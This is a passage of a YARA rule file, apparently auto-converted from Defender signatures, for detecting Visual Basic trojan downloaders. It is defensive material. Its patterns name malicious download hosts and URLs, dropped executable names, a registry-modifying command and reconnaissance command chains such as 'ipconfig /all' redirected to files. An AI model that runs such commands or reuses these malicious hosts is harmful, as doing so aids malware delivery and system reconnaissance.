        $x_1_2 = "wd=%B6%AB%B7%BD%C9%F1%C6%F0%D7%EE%D0%C2%CD%BC" wide //weight: 1
        $x_1_3 = "painweb.net/ht/" wide //weight: 1
        $x_1_4 = "baidu.com/img/logo-yy.gif" wide //weight: 1
        $x_1_5 = "QQOneClickApp" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_Win32_VB_XX_2147634521_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.XX"
        threat_id = "2147634521"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 00 39 00 37 00 38 00 63 00 66 00 2e 00 63 00 6f 00 6d 00 2f 00 6d 00 61 00 2f 00 ?? ?? 2e 00 65 00 78 00 65 00}  //weight: 1, accuracy: Low
        $x_1_2 = {43 00 3a 00 5c 00 57 00 49 00 4e 00 44 00 4f 00 57 00 53 00 5c 00 48 00 65 00 6c 00 70 00 5c 00 ?? ?? 2e 00 65 00 78 00 65 00}  //weight: 1, accuracy: Low
        $x_1_3 = "yuyanzhe.exe" wide //weight: 1
        $x_1_4 = "yuyanzhe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_OA_2147637431_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.OA"
        threat_id = "2147637431"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".xz19.com" wide //weight: 1
        $x_1_2 = {2f 00 78 00 7a 00 7a 00 2f 00 ?? ?? 2f 00 2f 00 71 00 72 00 6e 00 5f 00}  //weight: 1, accuracy: Low
        $x_1_3 = {2f 00 78 00 7a 00 7a 00 2f 00 ?? ?? 2f 00 2f 00 63 00 74 00 66 00 6d 00 6f 00 6e 00 5f 00}  //weight: 1, accuracy: Low
        $x_1_4 = {2f 00 78 00 7a 00 7a 00 2f 00 ?? ?? 2f 00 2f 00 6b 00 75 00 6f 00 64 00 6f 00 75 00 73 00 65 00 74 00 75 00 70 00 33 00 38 00 5f 00}  //weight: 1, accuracy: Low
        $x_1_5 = "@*\\AF:\\Application\\vc\\S\\12\\1.vbp" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_OB_2147637432_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.OB"
        threat_id = "2147637432"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".xz19.com" wide //weight: 1
        $x_1_2 = "/avtv/qrn.exe" wide //weight: 1
        $x_1_3 = "/avtv/ctfmon.exe" wide //weight: 1
        $x_1_4 = "/backup/KuoDouSetup38.exe" wide //weight: 1
        $x_1_5 = {40 00 2a 00 5c 00 41 00 46 00 3a 00 5c 00 41 00 70 00 70 00 6c 00 69 00 63 00 61 00 74 00 69 00 6f 00 6e 00 5c 00 76 00 63 00 5c 00 [0-16] 50 00 72 00 6a 00 46 00 54 00 50 00 44 00 6f 00 77 00 6e 00 2e 00 76 00 62 00 70 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_OC_2147637526_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.OC"
        threat_id = "2147637526"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "11156.net/mm/txt.txt" ascii //weight: 1
        $x_1_2 = "11156.net//tongji/count.asp" ascii //weight: 1
        $x_1_3 = "\\Internet Explorer\\IEXPLORE.EXE 33358.net" wide //weight: 1
        $x_1_4 = "\\Program Files\\360.exe" wide //weight: 1
        $x_1_5 = "//xu4.net?" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_OD_2147638015_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.OD"
        threat_id = "2147638015"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".xunlei100.com/youbak/" ascii //weight: 1
        $x_1_2 = {50 00 72 00 6f 00 67 00 72 00 61 00 6d 00 46 00 69 00 6c 00 65 00 73 00 ?? ?? ?? ?? ?? ?? ?? ?? 5c 00 79 00 78 00 79 00 36 00 31 00 33 00 2e 00 65 00 78 00 65 00}  //weight: 1, accuracy: Low
        $x_1_3 = {00 00 58 00 58 00 58 00 2e 00 65 00 78 00 65 00 00 00}  //weight: 1, accuracy: High
        $x_1_4 = {44 00 3a 00 5c 00 13 4e 28 75 5c 00 7d 59 8b 53 5c 00 7d 59 8b 53 5c 00 e5 5d 0b 7a 31 00 2e 00 76 00 62 00 70}  //weight: 1, accuracy: High
        $x_1_5 = {00 00 ae 5f 6f 8f 2d 4e fd 56 00 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_OE_2147638016_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.OE"
        threat_id = "2147638016"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".xz19.com" wide //weight: 1
        $x_1_2 = {2f 00 78 00 7a 00 7a 00 2f 00 ?? ?? ?? ?? ?? ?? 2f 00 71 00 72 00 6e 00 5f 00}  //weight: 1, accuracy: Low
        $x_1_3 = {64 00 6b 00 65 00 ?? ?? ?? ?? ?? ?? 2f 00 63 00 74 00 66 00 6d 00 6f 00 6e 00 5f 00}  //weight: 1, accuracy: Low
        $x_1_4 = "/kuodousetup38_" wide //weight: 1
        $x_1_5 = "@*\\AF:\\9359\\Project1.vbp" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_OF_2147638017_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.OF"
        threat_id = "2147638017"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 00 78 00 7a 00 31 00 39 00 2e 00 63 00 6f 00 6d 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 64 00 6f 00 77 00 6e 00 32 00}  //weight: 1, accuracy: Low
        $x_1_2 = " /xx /xzz/" wide //weight: 1
        $x_1_3 = " /xx /myie/" wide //weight: 1
        $x_1_4 = "@*\\AF:\\9359\\Project1.vbp" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_OG_2147638018_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.OG"
        threat_id = "2147638018"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".xz19.com" wide //weight: 1
        $x_1_2 = {2f 00 78 00 7a 00 7a 00 2f 00 ?? ?? 2f 00 2f 00 63 00 74 00 66 00 6d 00 6f 00 6e 00 5f 00}  //weight: 1, accuracy: Low
        $x_1_3 = {2f 00 6d 00 79 00 69 00 65 00 2f 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 2e 00 65 00 78 00 65 00 ?? ?? ?? ?? ?? ?? 6c 00 6d 00 30 00 32 00}  //weight: 1, accuracy: Low
        $x_1_4 = "@*\\AF:\\Application\\vc\\S\\12\\1.vbp" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_NP_2147638132_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.NP"
        threat_id = "2147638132"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "cmd /c regedit /s C:\\system.reg" wide //weight: 2
        $x_2_2 = "C:\\\\windows\\\\ctfmons.exe" wide //weight: 2
        $x_3_3 = "m2pk.com:2001/tst/abc.exe" wide //weight: 3
        $x_3_4 = "jianqiangzhe1.com/AddSetup.asp" wide //weight: 3
        $x_1_5 = "&localID=" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_2_*) and 1 of ($x_1_*))) or
            ((1 of ($x_3_*) and 1 of ($x_2_*))) or
            ((2 of ($x_3_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_Win32_VB_OH_2147638146_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.OH"
        threat_id = "2147638146"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "@*\\AF:\\9359\\Project1.vbp" wide //weight: 1
        $x_1_2 = {2e 00 78 00 7a 00 31 00 ?? ?? ?? ?? ?? ?? ?? ?? 39 00 2e 00 63 00 6f 00 6d 00}  //weight: 1, accuracy: Low
        $x_1_3 = {6c 00 6d 00 30 00 32 00 [0-16] 2f 00 6d 00 79 00 ?? ?? ?? ?? ?? ?? 69 00 65 00 2f 00}  //weight: 1, accuracy: Low
        $x_1_4 = {2f 00 6b 00 75 00 6f 00 ?? ?? ?? ?? ?? ?? ?? ?? 64 00 6f 00 75 00 ?? ?? ?? ?? ?? ?? 73 00 65 00 74 00 75 00 70 00 33 00 38 00 5f 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_OI_2147638803_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.OI"
        threat_id = "2147638803"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "_mucode.bak" wide //weight: 1
        $x_1_2 = ".save21.pe.kr" wide //weight: 1
        $x_1_3 = ".soii21.pe.kr" wide //weight: 1
        $x_1_4 = "/userhistory/userconnectall_com.asp" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_OJ_2147639050_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.OJ"
        threat_id = "2147639050"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "qqkuyou.cn/gg.asp?key=" wide //weight: 1
        $x_1_2 = "d.kele55.com/soft/kele55" wide //weight: 1
        $x_1_3 = "jvrswgxyzbdmptlfoihueqkacn4617832509" wide //weight: 1
        $x_1_4 = "10,5,4,2,9,8,10,5,12,5,3,2,1,1,7,6,2,1,1,3,3" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_ZZ_2147641116_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.ZZ"
        threat_id = "2147641116"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "vippin.cn/data.txt" wide //weight: 1
        $x_1_2 = "Cls_DownLoad" ascii //weight: 1
        $x_1_3 = "RavMonD" wide //weight: 1
        $x_1_4 = "dianxin.online.cq.cn/api/taobao" wide //weight: 1
        $x_1_5 = "del /f del.bat" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_QD_2147642415_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.QD"
        threat_id = "2147642415"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Project1.UserControl1" ascii //weight: 1
        $x_1_2 = "http://eateggsmore.info/" wide //weight: 1
        $x_1_3 = "GAYGAY.exe" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_QF_2147642431_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.QF"
        threat_id = "2147642431"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_5_1 = "http://ldmdownload.com/redir.php?o=" wide //weight: 5
        $x_2_2 = "&aff=" wide //weight: 2
        $x_1_3 = "SHDocVwCtl.WebBrowser" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_QN_2147644125_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.QN"
        threat_id = "2147644125"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {5c 00 45 00 74 00 68 00 65 00 6d 00 5c 00 42 00 75 00 72 00 65 00 61 00 75 00 62 00 6c 00 61 00 64 00 5c 00 4e 00 69 00 65 00 75 00 77 00 65 00 20 00 6d 00 61 00 70 00 [0-32] 2e 00 76 00 62 00 70 00}  //weight: 1, accuracy: Low
        $x_1_2 = "www.izlex.org/" wide //weight: 1
        $x_1_3 = "svshost.exe" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_YCS_2147644141_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.YCS"
        threat_id = "2147644141"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "PluginAdobe" ascii //weight: 1
        $x_1_2 = "URLDownloadToFileA" ascii //weight: 1
        $x_1_3 = "moduloa.swf" wide //weight: 1
        $x_1_4 = "SWSet\\setup.exe" wide //weight: 1
        $x_1_5 = {55 00 73 00 65 00 72 00 5c 00 44 00 65 00 73 00 6b 00 74 00 6f 00 70 00 5c 00 [0-112] 5c 00 6e 00 65 00 77 00 32 00 39 00 31 00 31 00 2e 00 76 00 62 00 70 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_RL_2147646416_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.RL"
        threat_id = "2147646416"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {5c 00 47 00 75 00 61 00 67 00 75 00 61 00 5c ?? ?? ?? ?? ?? ?? ?? (00|30|31|32|33|34|35|36|37|38|39) (00|30|31|32|33|34|35|36|37|38|39) 20 00 50 00 50 00 4c 00 69 00 76 00 65}  //weight: 1, accuracy: Low
        $x_1_2 = {5c 00 4c 00 6f 00 61 00 64 00 65 00 72 00 5f 00 66 00 6f 00 72 00 71 00 64 ?? ?? ?? ?? ?? (00|30|31|32|33|34|35|36|37|38|39) (00|30|31|32|33|34|35|36|37|38|39) 2e 00 65 00 78 00 65}  //weight: 1, accuracy: Low
        $x_1_3 = "qqkuyou.cn" wide //weight: 1
        $x_1_4 = {53 65 74 75 70 4d 65 10 00 70 70 65 76 ?? ?? (30|31|32|33|34|35|36|37|38|39) (30|31|32|33|34|35|36|37|38|39)}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_RQ_2147646476_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.RQ"
        threat_id = "2147646476"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "10"
        strings_accuracy = "High"
    strings:
        $x_5_1 = "c:\\oied.bak.vbs" wide //weight: 5
        $x_1_2 = "C:\\Program Files\\staticial" wide //weight: 1
        $x_1_3 = "C:\\windows\\staticial" wide //weight: 1
        $x_1_4 = "\\cmss.jyc,scanMiddle" wide //weight: 1
        $x_5_5 = "cmc.cxe /c ipconfig /all > c:\\WINDOWS\\Temp\\2020.tmp" ascii //weight: 5
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_5_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_Win32_VB_SG_2147647465_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.SG"
        threat_id = "2147647465"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "22"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {2a 00 56 00 49 00 52 00 54 00 55 00 41 00 4c 00 2a 00 [0-16] 2a 00 56 00 4d 00 57 00 41 00 52 00 45 00 2a 00 [0-16] 2a 00 56 00 42 00 4f 00 58 00 2a 00}  //weight: 10, accuracy: Low
        $x_10_2 = {69 00 70 00 63 00 6f 00 6e 00 66 00 69 00 67 00 20 00 2f 00 61 00 6c 00 6c 00 20 00 3e 00 20 00 [0-16] 6e 00 65 00 74 00 20 00 73 00 74 00 61 00 72 00 74 00 20 00 3e 00 3e 00 20 00 [0-16] 73 00 79 00 73 00 74 00 65 00 6d 00 69 00 6e 00 66 00 6f 00 20 00 3e 00 3e 00 20 00 [0-16] 6e 00 65 00 74 00 20 00 76 00 69 00 65 00 77 00 20 00 3e 00 3e 00 20 00 [0-16] 72 00 6f 00 75 00 74 00 65 00 20 00 70 00 72 00 69 00 6e 00 74 00 20 00 3e 00 3e 00 20 00 [0-16] 74 00 61 00 73 00 6b 00 6c 00 69 00 73 00 74 00 20 00 3e 00 3e 00}  //weight: 10, accuracy: Low
        $x_1_3 = {55 00 53 00 42 00 [0-16] 2e 00 65 00 78 00 65 00}  //weight: 1, accuracy: Low
        $x_1_4 = "inject.php" wide //weight: 1
        $x_1_5 = {52 00 75 00 6e 00 44 00 6c 00 6c 00 2e 00 62 00 61 00 74 00 [0-16] 53 00 79 00 73 00 69 00 6e 00 66 00 6f 00 2e 00 74 00 78 00 74 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_10_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_Win32_VB_SH_2147647468_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.SH"
        threat_id = "2147647468"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {5c 00 41 00 64 00 6d 00 69 00 6e 00 [0-16] 5c 00 44 00 65 00 73 00 6b 00 74 00 6f 00 70 00 [0-48] 46 00 69 00 6c 00 65 00 45 00 5a 00 20 00 48 00 54 00 54 00 50 00 5c 00 53 00 65 00 72 00 76 00 69 00 63 00 65 00 53 00 61 00 6d 00 70 00 6c 00 65 00 2e 00 76 00 62 00 70 00}  //weight: 1, accuracy: Low
        $x_1_2 = {69 00 70 00 63 00 6f 00 6e 00 66 00 69 00 67 00 20 00 2f 00 61 00 6c 00 6c 00 20 00 3e 00 20 00 [0-16] 6e 00 65 00 74 00 20 00 73 00 74 00 61 00 72 00 74 00 20 00 3e 00 3e 00 20 00 [0-16] 72 00 6f 00 75 00 74 00 65 00 20 00 70 00 72 00 69 00 6e 00 74 00 20 00 3e 00 3e 00 20 00 [0-16] 74 00 61 00 73 00 6b 00 6c 00 69 00 73 00 74 00 20 00 3e 00 3e 00}  //weight: 1, accuracy: Low
        $x_1_3 = "USBKey.exe" wide //weight: 1
        $x_1_4 = {73 00 79 00 73 00 6e 00 61 00 6d 00 65 00 [0-16] 69 00 6e 00 6a 00 65 00 63 00 74 00 2e 00 70 00 68 00 70 00}  //weight: 1, accuracy: Low
        $x_1_5 = {75 00 70 00 64 00 61 00 74 00 65 00 2e 00 70 00 68 00 70 00 [0-16] 70 00 72 00 6f 00 66 00 69 00 6c 00 65 00 2e 00 70 00 68 00 70 00}  //weight: 1, accuracy: Low
        $x_1_6 = {4d 00 61 00 73 00 73 00 [0-16] 74 00 79 00 70 00 65 00 [0-16] 6f 00 6e 00 6c 00 69 00 6e 00 65 00 2e 00 70 00 68 00 70 00}  //weight: 1, accuracy: Low
        $x_1_7 = {52 00 75 00 6e 00 44 00 6c 00 6c 00 2e 00 62 00 61 00 74 00 [0-16] 53 00 79 00 73 00 69 00 6e 00 66 00 6f 00 2e 00 74 00 78 00 74 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (6 of ($x*))
}

rule TrojanDownloader_Win32_VB_SL_2147647743_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.SL"
        threat_id = "2147647743"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "baixoassinado" ascii //weight: 1
        $x_1_2 = "URLDownloadToFileA" ascii //weight: 1
        $x_1_3 = "SWSet\\setup.exe" wide //weight: 1
        $x_1_4 = "Plg Adobe" wide //weight: 1
        $x_1_5 = {44 00 65 00 73 00 6b 00 74 00 6f 00 70 00 5c 00 6e 00 6f 00 76 00 69 00 6d 00 5c 00 6e 00 65 00 77 00 [0-16] 2e 00 76 00 62 00 70 00}  //weight: 1, accuracy: Low
        $x_1_6 = {44 00 65 00 73 00 6b 00 74 00 6f 00 70 00 5c 00 6c 00 6f 00 61 00 64 00 65 00 72 00 20 00 6e 00 6f 00 76 00 6f 00 5c 00 6e 00 65 00 77 00 [0-16] 2e 00 76 00 62 00 70 00}  //weight: 1, accuracy: Low
        $x_1_7 = {6c 00 6f 00 64 00 65 00 72 00 20 00 66 00 69 00 6c 00 65 00 20 00 76 00 62 00 20 00 6e 00 6f 00 76 00 6f 00 [0-32] 2e 00 76 00 62 00 70 00}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule TrojanDownloader_Win32_VB_ZO_2147648622_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.ZO"
        threat_id = "2147648622"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "dl.dropbox.com" wide //weight: 1
        $x_1_2 = {5c 00 78 00 70 00 5c 00 44 00 65 00 73 00 6b 00 74 00 6f 00 70 00 5c 00 50 00 65 00 67 00 61 00 74 00 6d 00 6c 00 20 00 50 00 5c 00 4c 00 6f 00 61 00 64 00 65 00 72 00 5c 00 [0-16] 5c 00 45 00 78 00 70 00 6c 00 6f 00 72 00 65 00 72 00 2e 00 76 00 62 00 70 00}  //weight: 1, accuracy: Low
        $x_1_3 = "Internet Explorer.exe" wide //weight: 1
        $x_1_4 = "load novo cript" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_SQ_2147648710_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.SQ"
        threat_id = "2147648710"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "\\system\\win.exe" wide //weight: 1
        $x_1_2 = {2e 00 63 00 6f 00 6d 00 2e 00 62 00 72 00 2f 00 [0-16] 2f 00 [0-4] 2e 00 6a 00 70 00 67 00}  //weight: 1, accuracy: Low
        $x_1_3 = "\\baixando4link\\Project1.vbp" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_SW_2147649110_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.SW"
        threat_id = "2147649110"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "15"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "/ad79.co.kr/" wide //weight: 10
        $x_1_2 = "Winhttp.WinHttpRequest." wide //weight: 1
        $x_1_3 = {63 00 3a 00 5c 00 69 00 70 00 2e 00 74 00 78 00 74 00 00 00}  //weight: 1, accuracy: High
        $x_1_4 = {26 00 70 00 69 00 64 00 3d 00 00 00}  //weight: 1, accuracy: High
        $x_1_5 = "&install=" wide //weight: 1
        $x_1_6 = "winmgmts:" wide //weight: 1
        $x_1_7 = "select * from win32_process where name=" wide //weight: 1
        $x_1_8 = {65 00 78 00 65 00 63 00 71 00 75 00 65 00 72 00 79 00 00 00}  //weight: 1, accuracy: High
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_10_*) and 5 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_Win32_VB_TH_2147651146_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.TH"
        threat_id = "2147651146"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = {c7 45 fc 06 00 00 00 8d 4d cc 89 8d ?? ff ff ff c7 85 ?? ff ff ff 09 40 00 00 8d 95 ?? ff ff ff 52 ff 15}  //weight: 3, accuracy: Low
        $x_1_2 = "reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Drivers32\" /v wavemapper /t reg_sz /d \"msaom32.drv\" /f" wide //weight: 1
        $x_1_3 = "\\servicesc.exe" wide //weight: 1
        $x_1_4 = "err.asp?alerr=sub:delcookie__errnb:" wide //weight: 1
        $x_1_5 = "/test/td.asp?id=" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_TL_2147652132_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.TL"
        threat_id = "2147652132"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_PEHSTR"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "2F726164696F2F686F6F6B446C6C2E6A7067" wide //weight: 1
        $x_1_2 = "2F726164696F2F696578706C6F7265722E6A7067" wide //weight: 1
        $x_1_3 = "5C73797374656D33325C686F6F6B446C6C2E646C6C" wide //weight: 1
        $x_1_4 = "5C73797374656D33325C4C65707265636861756E2E657865" wide //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_Win32_VB_TM_2147652134_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:Win32/VB.TM"
        threat_id = "2147652134"
        type = "TrojanDownloader"
        platform = "Win32: Windows 32-bit platform"
        family = "VB"
        severity = "Critical"
